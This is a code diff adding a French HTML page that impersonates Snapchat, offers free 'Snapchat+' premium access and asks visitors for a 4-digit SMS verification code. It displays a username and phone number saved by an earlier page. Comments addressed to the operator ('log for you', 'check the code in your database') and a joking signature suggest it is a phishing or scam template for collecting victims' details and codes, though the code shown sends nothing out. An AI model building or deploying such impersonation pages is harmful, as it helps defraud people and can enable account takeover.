@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat+ | Vérification SMS</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --snap-yellow: #FFFC00;
+            --snap-yellow-dark: #E6E300;
+            --snap-black: #000000;
+            --snap-gray: #1A1A1A;
+            --snap-light-gray: #2A2A2A;
+            --snap-text: #FFFFFF;
+            --snap-text-secondary: #AAAAAA;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--snap-black);
+            color: var(--snap-text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            line-height: 1.5;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-icon {
+            width: 60px;
+            height: 60px;
+            background-color: var(--snap-yellow);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+        }
+
+        .logo-icon i {
+            color: var(--snap-black);
+            font-size: 30px;
+        }
+
+        .logo-text {
+            font-size: 36px;
+            font-weight: 800;
+            color: var(--snap-yellow);
+        }
+
+        .logo-text span {
+            color: var(--snap-text);
+        }
+
+        /* Info box */
+        .info-box {
+            background-color: rgba(255, 252, 0, 0.1);
+            border: 1px solid var(--snap-yellow);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .info-box h3 {
+            color: var(--snap-yellow);
+            font-size: 18px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .info-box p {
+            color: var(--snap-text);
+            font-size: 16px;
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .user-info {
+            background-color: var(--snap-light-gray);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .user-info div {
+            margin: 8px 0;
+            font-size: 15px;
+        }
+
+        .user-info .username {
+            color: var(--snap-yellow);
+            font-weight: 600;
+        }
+
+        .user-info .phone {
+            color: var(--snap-text);
+        }
+
+        .sms-instruction {
+            color: var(--snap-yellow);
+            font-weight: 600;
+            font-size: 16px;
+            margin: 15px 0;
+        }
+
+        /* Form section */
+        .form-section {
+            background-color: var(--snap-gray);
+            border-radius: 16px;
+            padding: 30px;
+            border: 1px solid var(--snap-light-gray);
+            margin-bottom: 30px;
+        }
+
+        .form-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            text-align: center;
+            color: var(--snap-yellow);
+        }
+
+        /* Code input */
+        .code-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .code-input {
+            width: 60px;
+            height: 70px;
+            background-color: var(--snap-light-gray);
+            border: 2px solid #444;
+            border-radius: 10px;
+            color: var(--snap-text);
+            font-size: 32px;
+            font-weight: 700;
+            text-align: center;
+            font-family: monospace;
+            transition: all 0.3s;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: var(--snap-yellow);
+            background-color: rgba(255, 252, 0, 0.1);
+            transform: scale(1.05);
+        }
+
+        .code-hint {
+            color: var(--snap-text-secondary);
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 18px;
+            background-color: var(--snap-yellow);
+            color: var(--snap-black);
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .submit-button:hover:not(:disabled) {
+            background-color: var(--snap-yellow-dark);
+            transform: translateY(-2px);
+        }
+
+        .submit-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Messages */
+        .error-message {
+            display: none;
+            background-color: rgba(255, 0, 0, 0.1);
+            border: 1px solid #FF0000;
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+            color: #FF5555;
+            font-size: 14px;
+        }
+
+        .success-message {
+            display: none;
+            background-color: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00FF00;
+            border-radius: 12px;
+            padding: 25px;
+            margin-top: 20px;
+            text-align: center;
+            animation: fadeIn 0.5s;
+        }
+
+        .success-message i {
+            font-size: 40px;
+            color: #00FF00;
+            margin-bottom: 15px;
+        }
+
+        .success-message h3 {
+            color: #00FF00;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        .success-message p {
+            color: var(--snap-text);
+            font-size: 15px;
+            line-height: 1.5;
+        }
+
+        /* Resend option */
+        .resend-container {
+            text-align: center;
+            margin-top: 20px;
+            color: var(--snap-text-secondary);
+            font-size: 14px;
+        }
+
+        .resend-link {
+            color: var(--snap-yellow);
+            cursor: pointer;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        .resend-link:hover {
+            color: var(--snap-yellow-dark);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: var(--snap-text-secondary);
+            font-size: 13px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .signature {
+            margin-top: 20px;
+            font-size: 14px;
+            color: var(--snap-yellow);
+            font-style: italic;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 10px;
+            }
+            
+            .form-section {
+                padding: 20px;
+            }
+            
+            .code-input {
+                width: 50px;
+                height: 60px;
+                font-size: 28px;
+            }
+            
+            .code-inputs {
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-ghost"></i>
+                </div>
+                <div class="logo-text">Snapchat<span>+</span></div>
+            </div>
+        </div>
+
+        <!-- Info Box -->
+        <div class="info-box">
+            <h3><i class="fas fa-sms"></i> Vérification par SMS</h3>
+            <p>Entrez le code à 4 chiffres que vous avez reçu par SMS</p>
+            
+            <div class="user-info">
+                <div class="username" id="usernameDisplay"></div>
+                <div class="phone" id="phoneDisplay"></div>
+            </div>
+            
+            <div class="sms-instruction">
+                <i class="fas fa-mobile-alt"></i> Vérifiez vos messages SMS
+            </div>
+        </div>
+
+        <!-- Form Section -->
+        <div class="form-section">
+            <h2 class="form-title">Entrez le code de vérification</h2>
+            
+            <div class="code-container">
+                <div class="code-inputs">
+                    <input type="text" class="code-input" id="digit1" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="text" class="code-input" id="digit2" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="text" class="code-input" id="digit3" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="text" class="code-input" id="digit4" maxlength="1" inputmode="numeric" autocomplete="off">
+                </div>
+                <div class="code-hint">
+                    Code à 4 chiffres reçu par SMS
+                </div>
+            </div>
+            
+            <button type="button" class="submit-button" onclick="verifySMSCode()" id="verifyBtn">
+                <i class="fas fa-check-circle"></i> VÉRIFIER LE CODE
+            </button>
+            
+            <!-- Error Message -->
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-times-circle"></i> Code incorrect. Veuillez réessayer.
+            </div>
+            
+            <!-- Success Message -->
+            <div class="success-message" id="successMessage">
+                <i class="fas fa-check-circle"></i>
+                <h3>Vérification réussie !</h3>
+                <p>Votre compte Snapchat+ a été activé avec succès.</p>
+                <p>Vous recevrez vos identifiants d'ici quelques minutes.</p>
+            </div>
+            
+            <!-- Resend Option -->
+            <div class="resend-container">
+                <p>Vous n'avez pas reçu le SMS ?</p>
+                <p class="resend-link" onclick="resendSMS()">
+                    <i class="fas fa-redo"></i> Renvoyer le code
+                </p>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>Snapchat+ | Accès gratuit aux fonctionnalités premium</p>
+            <div class="signature">
+                Tech snap 😂
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Récupérer les données du localStorage
+        window.onload = function() {
+            const username = localStorage.getItem('snapchat_username');
+            const phone = localStorage.getItem('snapchat_phone');
+            
+            if (username && phone) {
+                // Afficher les informations utilisateur
+                document.getElementById('usernameDisplay').textContent = `Utilisateur: ${username}`;
+                document.getElementById('phoneDisplay').textContent = `Numéro: ${phone}`;
+                
+                // Focus sur le premier champ
+                document.getElementById("digit1").focus();
+            } else {
+                // Si pas de données, rediriger vers la page principale
+                alert("Session expirée. Veuillez recommencer l'inscription.");
+                window.location.href = "index.html";
+            }
+            
+            // Configurer l'auto-focus
+            setupCodeInputs();
+        };
+        
+        function setupCodeInputs() {
+            const inputs = document.querySelectorAll('.code-input');
+            
+            inputs.forEach((input, index) => {
+                // Se déplacer automatiquement vers le champ suivant
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1 && index < 3) {
+                        inputs[index + 1].focus();
+                    }
+                    
+                    // Vérifier si tous les champs sont remplis
+                    if (checkAllDigitsFilled()) {
+                        document.getElementById("verifyBtn").focus();
+                    }
+                });
+                
+                // Gérer les touches de suppression
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+                
+                // N'autoriser que les chiffres
+                input.addEventListener('keypress', (e) => {
+                    if (!/[0-9]/.test(e.key)) {
+                        e.preventDefault();
+                    }
+                });
+            });
+        }
+        
+        function checkAllDigitsFilled() {
+            const digit1 = document.getElementById("digit1").value;
+            const digit2 = document.getElementById("digit2").value;
+            const digit3 = document.getElementById("digit3").value;
+            const digit4 = document.getElementById("digit4").value;
+            
+            return digit1 && digit2 && digit3 && digit4;
+        }
+        
+        function getEnteredCode() {
+            const digit1 = document.getElementById("digit1").value;
+            const digit2 = document.getElementById("digit2").value;
+            const digit3 = document.getElementById("digit3").value;
+            const digit4 = document.getElementById("digit4").value;
+            
+            return digit1 + digit2 + digit3 + digit4;
+        }
+        
+        function verifySMSCode() {
+            const enteredCode = getEnteredCode();
+            const savedCode = localStorage.getItem('sms_verification_code');
+            const verifyBtn = document.getElementById("verifyBtn");
+            const errorMessage = document.getElementById("errorMessage");
+            const successMessage = document.getElementById("successMessage");
+            
+            // Vérifier que les 4 chiffres sont entrés
+            if (enteredCode.length !== 4) {
+                alert("Veuillez entrer les 4 chiffres du code SMS.");
+                document.getElementById("digit1").focus();
+                return;
+            }
+            
+            // Désactiver le bouton pendant la vérification
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VÉRIFICATION...';
+            
+            // Simuler une vérification
+            setTimeout(() => {
+                // 🔴 ICI TU DOIS VÉRIFIER LE CODE DANS TA BASE DE DONNÉES 🔴
+                
+                if (enteredCode === savedCode) {
+                    // SUCCÈS
+                    errorMessage.style.display = "none";
+                    successMessage.style.display = "block";
+                    
+                    // Désactiver les champs
+                    document.querySelectorAll('.code-input').forEach(input => {
+                        input.disabled = true;
+                        input.style.opacity = "0.7";
+                    });
+                    
+                    // Mettre à jour le bouton
+                    verifyBtn.innerHTML = '<i class="fas fa-check"></i> CODE VALIDÉ';
+                    verifyBtn.style.backgroundColor = "#00FF00";
+                    verifyBtn.style.color = "#000000";
+                    
+                    // 🔴 LOG POUR TOI 🔴
+                    console.log("✅ VÉRIFICATION RÉUSSIE !");
+                    console.log("Code entré:", enteredCode);
+                    
+                    // Effacer le localStorage après succès
+                    setTimeout(() => {
+                        localStorage.clear();
+                    }, 3000);
+                    
+                } else {
+                    // ÉCHEC
+                    errorMessage.style.display = "block";
+                    successMessage.style.display = "none";
+                    
+                    // Réactiver le bouton
+                    verifyBtn.disabled = false;
+                    verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> VÉRIFIER LE CODE';
+                    
+                    // Focus sur le premier champ
+                    document.getElementById("digit1").focus();
+                    document.getElementById("digit1").select();
+                }
+            }, 1000);
+        }
+        
+        function resendSMS() {
+            const phone = localStorage.getItem('snapchat_phone');
+            
+            if (!phone) {
+                alert("Erreur : Impossible de retrouver votre numéro.");
+                return;
+            }
+            
+            // Demander confirmation
+            if (!confirm(`Renvoyer un nouveau code SMS au ${phone} ?`)) {
+                return;
+            }
+            
+            // 🔴 ICI TU DOIS RENVOYER UN NOUVEAU SMS 🔴
+            const newCode = Math.floor(1000 + Math.random() * 9000).toString();
+            
+            // Sauvegarder le nouveau code
+            localStorage.setItem('sms_verification_code', newCode);
+            
+            // Réinitialiser les champs
+            document.querySelectorAll('.code-input').forEach(input => {
+                input.value = '';
+                input.disabled = false;
+                input.style.opacity = "1";
+            });
+            
+            // Réinitialiser les messages
+            document.getElementById("errorMessage").style.display = "none";
+            document.getElementById("successMessage").style.display = "none";
+            
+            // Réinitialiser le bouton
+            const verifyBtn = document.getElementById("verifyBtn");
+            verifyBtn.disabled = false;
+            verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> VÉRIFIER LE CODE';
+            verifyBtn.style.backgroundColor = "";
+            verifyBtn.style.color = "";
+            
+            // Focus sur le premier champ
+            document.getElementById("digit1").focus();
+            
+            // Message
+            alert(`📱 Nouveau SMS envoyé !\n\nVérifiez vos messages sur ${phone}`);
+            
+            // 🔴 LOG POUR TOI 🔴
+            console.log("🔄 NOUVEAU SMS DEMANDÉ");
+            console.log("Nouveau code à envoyer:", newCode);
+        }
+        
+        // Permettre la vérification avec la touche Entrée
+        document.addEventListener("keypress", function(event) {
+            if (event.key === "Enter" && checkAllDigitsFilled()) {
+                event.preventDefault();
+                verifySMSCode();
+            }
+        });
+    </script>
+</body>
+</html>
